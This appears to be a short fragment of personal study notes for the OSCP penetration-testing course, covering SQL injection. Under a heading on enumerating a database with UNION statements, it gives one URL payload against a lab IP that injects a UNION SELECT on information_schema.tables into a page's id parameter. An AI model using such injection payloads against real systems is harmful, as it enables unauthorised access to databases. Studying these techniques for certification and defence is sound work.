# oscp-notes

##SQL Injection

###Enumerating the Database (using union statements)
```
http://10.11.14.19/comment.php?id=782%20union%20select%201,2,3,4,table_name,6%20from%20information_schema.tables
